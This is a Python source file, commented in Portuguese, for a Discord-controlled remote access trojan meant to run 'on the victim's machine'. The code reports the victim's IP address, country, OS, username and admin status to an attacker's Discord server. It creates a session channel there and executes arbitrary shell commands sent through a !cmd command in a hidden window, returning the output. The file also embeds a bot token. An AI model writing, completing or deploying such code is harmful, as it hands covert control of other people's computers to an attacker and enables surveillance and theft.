# Arquivo Client Principal - Executado na máquina da vítima
# Início: 30/04/2025 | Última atualização: 30/04/2025

import discord
from discord.ext import commands
import ctypes
import os
import platform
import re
import urllib.request
import json
import subprocess
import sys

# Configurações
TOKEN='MTM2NjQ2MTcwMTg0NjcyODgwNQ.GmXVk1.Z11MMSsvVkkczYpDgrf7E7_5v04MO6TlGRyB08'
SESSION_PREFIX = "session-"
GUILD_ID = 1366462091954880564

# Intents e Client
intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix='!', intents=intents)

# Função para executar comandos no PC da vítima
def execute_command(command):
    try:
        if platform.system() == "Windows":
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        
        stdout, stderr = process.communicate()
        
        if stdout:
            result = stdout.decode('utf-8', errors='replace')
        elif stderr:
            result = stderr.decode('utf-8', errors='replace')
        else:
            result = "[+] non output."
            
        return result
    except Exception as e:
        return f"Erro ao executar comando: {str(e)}"

# Função para pegar IP e País (Depois mudamos de lugar)
def get_ip_info():
    try:
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            data = json.loads(url.read().decode())
            return data.get('IPv4'), data.get('country_code')
    except:
        return "Unknown", "xx"

@client.event
async def on_ready():
    print("[+] Connected")

    # Coleta das informações básicas
    ip, flag = get_ip_info()
    os_info = f"{platform.system()} {platform.release()}"
    user = os.getlogin()
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    # Criação de canal com nome sequencial 
    guild = discord.utils.get(client.guilds, id=GUILD_ID)
    channel_names = [ch.name for ch in guild.text_channels if ch.name.startswith(SESSION_PREFIX)]
    numbers = [int(re.search(rf"{SESSION_PREFIX}(\d+)", name).group(1)) for name in channel_names if re.search(rf"{SESSION_PREFIX}(\d+)", name)]
    next_number = max(numbers) + 1 if numbers else 1
    channel_name = f"{SESSION_PREFIX}{next_number}"

    channel = await guild.create_text_channel(channel_name)
    print(f"[+] Channel Created: {channel_name}")

    # Salva a sessão para comandos
    global session_channel_id
    session_channel_id = channel.id

    # Mensagem de notificação
    admin_icon = " | :gem:" if is_admin else ""
    msg = (
        f"@here :white_check_mark: New session started `{channel_name}` | "
        f"{os_info} | {ip} :flag_{flag.lower()}: | User: `{user}`{admin_icon}"
    )
    await channel.send(msg)

    # Status do bot
    status = discord.Game("Made by Apophenia, Ace")
    await client.change_presence(status=discord.Status.online, activity=status)

@client.command()
async def cmd(ctx, *, command=None):
    if ctx.channel.id != session_channel_id:
        return
    
    if not command:
        await ctx.send("```Uso: !cmd <comando>```")
        return    
    
    result = execute_command(command)
    
    if len(result) > 1900:
        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for i, chunk in enumerate(chunks):
            await ctx.send(f"```[Parte {i+1}/{len(chunks)}]\n{chunk}```")
    else:
        await ctx.send(f"```{result}```")

client.run(TOKEN)